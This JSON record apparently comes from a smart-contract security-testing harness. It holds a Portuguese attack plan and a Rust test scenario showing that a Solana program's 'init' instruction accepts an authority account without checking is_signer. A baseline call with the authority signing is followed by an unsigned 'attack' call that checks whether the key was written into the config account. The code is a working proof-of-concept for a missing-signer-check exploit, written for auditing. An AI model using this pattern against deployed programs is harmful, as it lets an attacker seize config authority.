attempts.raw:
{
  "plan": "O programa `init` (Pinocchio) grava a chave de `accounts[1]` como autoridade da config sem verificar `is_signer`. Vou preparar uma conta `config` existente (com dados iniciais) e uma conta `authority` que NAO assina. O baseline chama `init` com a authority assinando (uso legitimo) e deve ter sucesso. O ataque chama a mesma instrucao com a mesma authority, mas sem a flag de signer; se o programa aceitar, a chave da authority sera gravada nos bytes 8..40 da config, demonstrando que qualquer chave pode ser registrada sem assinatura.",
  "scenario": "let config_key = Pubkey::new_unique();
let authority_key = Pubkey::new_unique();

let config_data = vec![0u8; 49];
let config_account = account(&env.program_id, &config_data, None);
let authority_account = wallet(1_000_000_000);

let metas_legit = vec![
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(authority_key, true),
];
let ix_legit = env.raw_ix(&[0u8], metas_legit);
let contas_legit = vec![
    (config_key, config_account.clone()),
    (authority_key, authority_account.clone()),
];
let r_legit = env.baseline("init legitimo com authority assinando", &ix_legit, &contas_legit);

let config_pos = after(&r_legit, &config_key).clone();

let metas_ataque = vec![
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(authority_key, false),
];
let ix_ataque = env.raw_ix(&[0u8], metas_ataque);
let contas_ataque = vec![
    (config_key, config_pos),
    (authority_key, authority_account),
];
let r = env.attack("init sem assinatura da authority", &ix_ataque, &contas_ataque);

if r.program_result == ProgramResult::Success {
    let dados = after(&r, &config_key).data();
    let autoridade_gravada = read_pubkey(dados, 8);
    env.effect(
        "authority gravada na config sem assinatura",
        autoridade_gravada == authority_key,
    );
}"
}

